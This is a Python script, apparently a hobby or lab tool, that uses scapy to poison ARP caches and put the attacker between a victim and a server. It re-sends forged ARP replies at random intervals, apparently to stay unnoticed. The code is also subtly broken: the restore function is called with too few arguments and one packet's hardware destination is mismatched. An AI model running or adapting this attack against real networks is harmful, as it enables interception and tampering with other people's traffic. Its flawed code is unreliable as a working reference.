from scapy.all import ARP, Ether, conf, getmacbyip, get_if_hwaddr, get_if_addr, sendp

import time
import random as rd

interface = conf.iface

macAttacker = get_if_hwaddr(interface)
ipAttacker = get_if_addr(interface)


macVictim = "ff:ff:ff:ff:ff:ff"
ipVictim = "255.255.255.255"

macServer = "ff:ff:ff:ff:ff:ff"
ipServer = "255.255.255.255"

def MIMspoofARP(ipVictim, ipServer):
    macVictim = getmacbyip(ipVictim)
    macServer = getmacbyip(ipServer)

    arpTo = Ether() / ARP()
    arpTo[Ether].src = macAttacker
    arpTo[ARP].hwsrc = macAttacker
    arpTo[ARP].psrc = ipServer
    arpTo[ARP].hwdst = macServer
    arpTo[ARP].pdst = ipVictim

    arpFrom = Ether() / ARP()
    arpFrom[Ether].src = macAttacker
    arpFrom[ARP].hwsrc = macAttacker
    arpFrom[ARP].psrc = ipVictim
    arpFrom[ARP].hwdst = macServer
    arpFrom[ARP].pdst = ipServer

    try:
        while(True):
            print("Poisoning Arp table")
            sendp(arpTo, iface=interface, verbose=False)
            sendp(arpFrom, iface=interface, verbose=False)
            time.sleep(rd.randrange(20,60))
    except KeyboardInterrupt:
        undoARPSpoof(ipVictim, ipServer)


def undoARPSpoof(ipVictim, ipServer, macVictim, macServer):
    undoVictim = ARP(hwsrc=macVictim, psrc=ipVictim, hwdst=macServer, pdst=ipServer)
    undoServer = ARP(hwdst=macVictim, pdst=ipVictim, hwsrc=macServer, psrc=ipServer)

    sendp(undoVictim, iface=interface, count=4, verbose=False)
    sendp(undoServer, iface=interface, count=4, verbose=False)


MIMspoofARP(ipVictim, ipServer)